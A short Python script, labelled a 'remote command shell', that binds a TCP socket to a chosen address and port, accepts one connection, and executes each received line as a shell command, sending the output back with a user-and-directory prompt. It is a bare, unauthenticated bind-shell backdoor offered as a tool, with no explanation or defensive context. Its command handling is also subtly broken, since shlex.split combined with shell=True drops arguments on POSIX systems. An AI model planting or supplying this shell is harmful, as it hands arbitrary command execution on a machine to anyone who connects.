import subprocess
import sys
import os
import socket
import argparse
import shlex

def execute(cmd = ''):
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
        return output.decode()
    except Exception as err:
        print('Error in execute: ', err)
        return str(err) + '\n'

def start_process(args):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server = (args.target, args.port)

        sock.bind(server)
        sock.listen(1)

        buf = b''

        client, _ = sock.accept()

        while True:
            client.send(f'[{os.environ.get( "USERNAME" )}]-[{os.getcwd()}]$'.encode())
            while '\n' not in buf.decode():
                buf += client.recv(64)
            output = execute(buf.decode())
            client.send(output.encode())
            buf = b''
    except Exception as err:
        print('Error in start_process: ', err)
        sock.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='remote command shell')
    parser.add_argument('-t', '--target', help='target ip')
    parser.add_argument('-p', '--port', type=int, help='target port')
    args = parser.parse_args()

    start_process(args)

